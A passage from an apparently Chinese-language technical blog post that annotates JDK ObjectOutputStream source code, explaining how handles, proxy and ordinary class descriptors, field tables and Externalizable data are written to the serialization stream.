<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写出一个“对象句柄引用”（reference），即指向**此前已写出对象**的回引。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议语义：</span></span><br><span class="line"><span class="comment"> * - 结构化标记 TC_REFERENCE (0x71) 后跟 4 字节的“wire handle id”（网络句柄 ID）。</span></span><br><span class="line"><span class="comment"> * - 该 ID = baseWireHandle + handle，其中：</span></span><br><span class="line"><span class="comment"> *     * handle：本地句柄表（handles）的下标，范围从 0 递增；</span></span><br><span class="line"><span class="comment"> *     * baseWireHandle：协议常量，固定为 0x7E0000（参见 ObjectStreamConstants）。</span></span><br><span class="line"><span class="comment"> *   因此，第一次登记的对象在“线上”的句柄是 0x7E0000，第二个是 0x7E0001，如此类推。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这么设计的原因：</span></span><br><span class="line"><span class="comment"> * - 将“线上句柄 ID”映射到一个**不与其他标记/保留值冲突的正区间**，便于接收端区分与校验。</span></span><br><span class="line"><span class="comment"> * - 发送端用本地下标（handle）管理对象共享关系；接收端收到 (base + n) 后，会减去 base 并在其</span></span><br><span class="line"><span class="comment"> *   自己的句柄表中取回对应对象，实现“别名/共享引用”的还原。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 与 unshared 的关系：</span></span><br><span class="line"><span class="comment"> * - 若对象按“非共享（unshared）”语义写出，就**不会登记到句柄表**，因此也不会出现对它的 TC_REFERENCE。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I/O 细节：</span></span><br><span class="line"><span class="comment"> * - writeInt 按 **big-endian** 写 4 字节整数（Java DataOutput 的标准字节序）。</span></span><br><span class="line"><span class="comment"> * - 本方法只负责写“引用”；对象本体的首次写出由其他路径完成（并在其处进行 handles.assign 登记）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 示例（handle==3）：</span></span><br><span class="line"><span class="comment"> *   输出：0x71（TC_REFERENCE）</span></span><br><span class="line"><span class="comment"> *       + 00 7E 00 03（int 0x007E0003，即 0x7E0000 + 3 的 big-endian 表示）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeHandle</span><span class="params">(<span class="type">int</span> handle)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_REFERENCE);               <span class="comment">// 0x71</span></span><br><span class="line">    bout.writeInt(baseWireHandle + handle);     <span class="comment">// baseWireHandle 固定为 0x7E0000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeProxyDesc</code> 则写入动态代理类的信息，包括代理实现的接口名称等。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“动态代理类”的类描述符（proxy class descriptor）写入序列化流。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 结构（概念示意，对应反序列化时的读取顺序）：</span></span><br><span class="line"><span class="comment"> *   TC_PROXYCLASSDESC                // 0x7D：动态代理类描述符标记</span></span><br><span class="line"><span class="comment"> *   int interfaceCount               // 代理类实现的接口数量</span></span><br><span class="line"><span class="comment"> *   UTF interfaceName[interfaceCount]// 每个接口的全限定名（MUTF-8）</span></span><br><span class="line"><span class="comment"> *   classAnnotations                 // 以 Block-Data 形式书写的“类注解块”</span></span><br><span class="line"><span class="comment"> *     TC_BLOCKDATA...                // 可有零个或多个块（由 annotateProxyClass 写入）</span></span><br><span class="line"><span class="comment"> *     ...</span></span><br><span class="line"><span class="comment"> *     TC_ENDBLOCKDATA                // 0x78：注解块结束</span></span><br><span class="line"><span class="comment"> *   superClassDesc                   // 父类的类描述符（对 JDK 动态代理来说通常是 java.lang.reflect.Proxy）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 与普通类（TC_CLASSDESC）不同，动态代理类使用 TC_PROXYCLASSDESC，并写出“接口列表”而不是字段表。</span></span><br><span class="line"><span class="comment"> * - “类注解块”是留给子类扩展用的钩子（annotateProxyClass）；默认不写内容，但必须用</span></span><br><span class="line"><span class="comment"> *   Block-Data 包裹，并以 TC_ENDBLOCKDATA 结束，保证协议对齐。</span></span><br><span class="line"><span class="comment"> * - 类描述符对象（ObjectStreamClass，简称 desc）也会参与句柄共享；允许后续以 TC_REFERENCE 回指。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 写入“动态代理类描述符”标记（结构化标记，不属于块数据）</span></span><br><span class="line">    bout.writeByte(TC_PROXYCLASSDESC); <span class="comment">// 0x7D</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 为“类描述符对象本身”分配/登记句柄，以便后续引用（除非采用 unshared 语义）</span></span><br><span class="line">    <span class="comment">//    - unshared == true  ：不登记到句柄表（后续不能通过 TC_REFERENCE 回指这个 desc）</span></span><br><span class="line">    <span class="comment">//    - unshared == false ：登记，使之可共享（常规路径）</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 写出“该代理类实现的接口列表”</span></span><br><span class="line">    <span class="comment">//    - desc.forClass() 返回此描述符对应的运行时 Class（这里是一个 Proxy 生成的类）</span></span><br><span class="line">    <span class="comment">//    - getInterfaces() 返回代理类直接实现的接口数组</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    Class&lt;?&gt;[] ifaces = cl.getInterfaces();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.1 先写接口数量（4 字节 int）</span></span><br><span class="line">    bout.writeInt(ifaces.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 逐个写接口名（MUTF-8，使用 getName() 的全限定名形式，如 &quot;java.lang.Runnable&quot;）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ifaces.length; i++) &#123;</span><br><span class="line">        bout.writeUTF(ifaces[i].getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写“类注解块”（classAnnotations）：</span></span><br><span class="line">    <span class="comment">//    - 按协议，此部分必须以 Block-Data 模式写入（可能为空）</span></span><br><span class="line">    <span class="comment">//    - 默认实现的 annotateProxyClass(cl) 不写任何内容；子类可重写添加自定义字节</span></span><br><span class="line">    <span class="comment">//    - 由于这是留给子类扩展的“开放区域”，故在真正写入注解前切换到块数据模式</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 安全检查（仅当当前 ObjectOutputStream 是自定义子类时才进行）：</span></span><br><span class="line">    <span class="comment">//     - isCustomSubclass()：判断本对象是否为 OOS 的自定义子类（而非 JDK 原生类）</span></span><br><span class="line">    <span class="comment">//     - ReflectUtil.checkPackageAccess(cl)：在启用 SecurityManager 的环境中，</span></span><br><span class="line">    <span class="comment">//       校验是否允许访问 cl 所在包（避免非受信子类借注解扩展对敏感类写入信息）</span></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 允许子类在“类描述符注解”区域写入自定义数据（会被当作 Block-Data 片段）</span></span><br><span class="line">    <span class="comment">//     - 默认实现通常什么都不写</span></span><br><span class="line">    annotateProxyClass(cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.3 结束注解块写入：切回非块模式，并写 TC_ENDBLOCKDATA（注解结束标记）</span></span><br><span class="line">    <span class="comment">//     - 注意：注解数据内容本身是以若干 TC_BLOCKDATA/TC_BLOCKDATALONG 块写的，</span></span><br><span class="line">    <span class="comment">//       这里切回非块模式是为了写结构化的“结束标记”</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA); <span class="comment">// 0x78</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 递归写出“父类”的类描述符（superClassDesc）：</span></span><br><span class="line">    <span class="comment">//    - 对 JDK 动态代理类而言，其父类通常是 java.lang.reflect.Proxy</span></span><br><span class="line">    <span class="comment">//    - 这里强制使用“共享语义”（false），这样父类描述符也可被后续引用，避免重复写入</span></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeNonProxyDesc</code> 则写入普通类的基本信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“普通类”（非动态代理类）的类描述符写入到序列化流中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 写出结构（概念示意，对应接收端读取顺序）：</span></span><br><span class="line"><span class="comment"> *   TC_CLASSDESC                // 0x72：普通类描述符标记</span></span><br><span class="line"><span class="comment"> *   classDescBody               // 类名、SUID、类标志、字段表、可选注解块占位等（见下）</span></span><br><span class="line"><span class="comment"> *   classAnnotations            // 以 Block-Data 方式写出的“类注解块”（可为空）</span></span><br><span class="line"><span class="comment"> *     TC_BLOCKDATA...           // 若有注解，由 annotateClass 写入的原始字节块</span></span><br><span class="line"><span class="comment"> *     ...</span></span><br><span class="line"><span class="comment"> *     TC_ENDBLOCKDATA           // 0x78：注解块结束标记</span></span><br><span class="line"><span class="comment"> *   superClassDesc              // 父类的类描述符（递归相同格式，直至 Object 的 TC_NULL）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * - 与动态代理类（TC_PROXYCLASSDESC）不同，普通类在“类体”里写**字段表**而非接口列表。</span></span><br><span class="line"><span class="comment"> * - 类描述符对象（ObjectStreamClass, desc）也参与句柄共享（handles），以避免重复输出。</span></span><br><span class="line"><span class="comment"> * - “类注解块”是留给子类扩展（annotateClass）的开放区域，必须用 Block-Data 包裹并以</span></span><br><span class="line"><span class="comment"> *   TC_ENDBLOCKDATA 结束，随后才写父类描述符。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeNonProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 结构化标记：普通类描述符</span></span><br><span class="line">    bout.writeByte(TC_CLASSDESC); <span class="comment">// 0x72</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 为“类描述符对象本身”分配/登记句柄（除非按 unshared 语义不共享）</span></span><br><span class="line">    <span class="comment">//    - unshared == true  ：不登记到句柄表（后续不能 TC_REFERENCE 回指该 desc）</span></span><br><span class="line">    <span class="comment">//    - unshared == false ：登记，可共享（常规）</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 写入“类描述符主体”（classDescBody）：</span></span><br><span class="line">    <span class="comment">//    - 内容包括：类名（UTF）、serialVersionUID（long）、类标志（byte）、字段数量（short）、</span></span><br><span class="line">    <span class="comment">//      字段表（类型码/签名 + 字段名 + 对象字段的签名 UTF）、以及一个“注解块的占位”（随后单独写）</span></span><br><span class="line">    <span class="comment">//    - 不同协议版本对“是否允许类描述符写钩子”处理不同：</span></span><br><span class="line">    <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">        <span class="comment">// 旧协议（stream protocol v1）不调用写钩子（writeClassDescriptor），</span></span><br><span class="line">        <span class="comment">// 直接让描述符按旧格式把主体写入。</span></span><br><span class="line">        <span class="comment">// 典型地，它会写出与 v1 兼容的 classDescBody。</span></span><br><span class="line">        desc.writeNonProxy(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 新协议（stream protocol v2，JDK 默认）：调用可被子类覆写的钩子，</span></span><br><span class="line">        <span class="comment">// 允许自定义类描述符的主体写法（默认实现等价于 v2 格式的标准输出）。</span></span><br><span class="line">        writeClassDescriptor(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写“类注解块”（classAnnotations）</span></span><br><span class="line">    <span class="comment">//    - 这部分必须在 Block-Data 模式下写（可能为空）；</span></span><br><span class="line">    <span class="comment">//    - 默认 annotateClass(cl) 不写内容；自定义子类可在此输出额外元数据（按块写）。</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换到块数据模式，准备写注解块的原始字节（若有）</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全检查（仅当当前 ObjectOutputStream 是“自定义子类”时启用）：</span></span><br><span class="line">    <span class="comment">// - isCustomSubclass()：判断是否为 OOS 的用户自定义子类；</span></span><br><span class="line">    <span class="comment">// - ReflectUtil.checkPackageAccess(cl)：在启用 SecurityManager 时校验包访问权限，</span></span><br><span class="line">    <span class="comment">//   避免非受信子类对敏感类写入注解数据。</span></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 允许子类向“类注解块”写入自定义数据（作为一个或多个 TC_BLOCKDATA* 片段）；</span></span><br><span class="line">    <span class="comment">// 默认实现通常不写任何内容。</span></span><br><span class="line">    annotateClass(cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结束注解块：切回“非块模式”以写结构化的结束标记，然后写 TC_ENDBLOCKDATA(0x78)</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 递归写出“父类”的类描述符：</span></span><br><span class="line">    <span class="comment">//    - 按协议，这里必须紧随注解块之后写父类描述符（或 TC_NULL 表示无父类）；</span></span><br><span class="line">    <span class="comment">//    - 使用共享语义（false），使父类描述符也能被后续引用，避免重复写。</span></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中写入“类描述符主体”实际调用的都是 <code>desc.writeNonProxy</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    desc.writeNonProxy(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeNonProxy</code> 会将类名、类型、字段等信息写入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“普通类（非动态代理）”的类描述符主体信息写入到给定的 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 本方法仅负责 **classDesc 的主体**（类名、SUID、flags、字段表）；“类注解块”和“父类描述符”</span></span><br><span class="line"><span class="comment"> *   由上层的 writeNonProxyDesc(...) 负责紧随其后写出。</span></span><br><span class="line"><span class="comment"> * - 与动态代理类（TC_PROXYCLASSDESC）不同，普通类使用 TC_CLASSDESC 并包含字段表。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 写类的“二进制名”（例如 java.lang.String），使用 MUTF-8（writeUTF 会写 2 字节长度前缀）</span></span><br><span class="line">    out.writeUTF(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 写 serialVersionUID（long，8 字节，大端）</span></span><br><span class="line">    out.writeLong(getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 组装并写入“类标志位”（flags）</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">        <span class="comment">// Externalizable：实例数据由对象自己的 writeExternal 写；读取端也走 readExternal</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 协议版本控制：</span></span><br><span class="line">        <span class="comment">// - 在 v2（默认）协议下，Externalizable 的数据需要以 Block-Data 包裹（读端据此按块读取）</span></span><br><span class="line">        <span class="comment">// - 在 v1 协议下，不使用 Block-Data 包裹，按老格式读写</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">protocol</span> <span class="operator">=</span> out.getProtocolVersion();</span><br><span class="line">        <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">        <span class="comment">// Serializable：按默认/自定义 writeObject 机制写实例数据</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">        <span class="comment">// 该类声明了私有的 writeObject(ObjectOutputStream)：</span></span><br><span class="line">        <span class="comment">// - 读端据此知道：除默认字段外，还将出现一段由 writeObject 写入的“自定义数据区”</span></span><br><span class="line">        <span class="comment">// - 在 v2 协议下，自定义数据区同样以 Block-Data 包裹</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">        <span class="comment">// 枚举类标记：读端据此采用枚举的特殊规则（值以“常量名字符串”表示）</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.writeByte(flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写字段表</span></span><br><span class="line">    <span class="comment">// - 仅包含“可持久化字段”（非 static / 非 transient），顺序由 ObjectStreamClass 预先规范化</span></span><br><span class="line">    <span class="comment">// - 字段条目结构：</span></span><br><span class="line">    <span class="comment">//     [1字节 typecode][UTF 字段名][若为非原始类型再写 UTF 的签名 typeString]</span></span><br><span class="line">    out.writeShort(fields.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.1 字段类型码</span></span><br><span class="line">        out.writeByte(f.getTypeCode());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.2 字段名（UTF）</span></span><br><span class="line">        out.writeUTF(f.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.3 对于“非原始类型字段”，还需写“类型签名字符串”（例如 &quot;Ljava/lang/String;&quot;、&quot;[I&quot;）</span></span><br><span class="line">        <span class="comment">//     写入时采用“对象字符串”语义（可被句柄引用复用），而不是简单的 writeUTF</span></span><br><span class="line">        <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">            out.writeTypeString(f.getTypeString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="writeExternalData"><a href="#writeExternalData" class="headerlink" title="writeExternalData"></a>writeExternalData</h3><p>当一个类实现了 <code>Externalizable</code> 接口且不是代理类的对象进行序列化的时候会调用 <code>writeExternalData</code> 写入实例数据。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过调用对象自身的 writeExternal() 方法，写出其 Externalizable 数据区。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点（默认使用 Stream Protocol Version 2）：</span></span><br><span class="line"><span class="comment"> * - 在 v2 下，外部化数据必须被“块数据”（Block-Data）包裹：</span></span><br><span class="line"><span class="comment"> *     setBlockDataMode(true)</span></span><br><span class="line"><span class="comment"> *       → obj.writeExternal(this)   // 由对象自行写出原始字段/对象等</span></span><br><span class="line"><span class="comment"> *     setBlockDataMode(false)</span></span><br><span class="line"><span class="comment"> *     writeByte(TC_ENDBLOCKDATA)    // 0x78，标记外部化数据区结束</span></span><br><span class="line"><span class="comment"> * - 在 v1 下，不使用 Block-Data 包裹（兼容旧协议）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义区别：</span></span><br><span class="line"><span class="comment"> * - Externalizable：对象完全掌控序列化内容（实现 writeExternal/readExternal），</span></span><br><span class="line"><span class="comment"> *   不走默认的 defaultWriteObject/字段自动遍历逻辑。</span></span><br><span class="line"><span class="comment"> * - 因此在执行 writeExternal 时，会清空与“默认序列化路径”相关的上下文（curContext/curPut），</span></span><br><span class="line"><span class="comment"> *   防止对象在 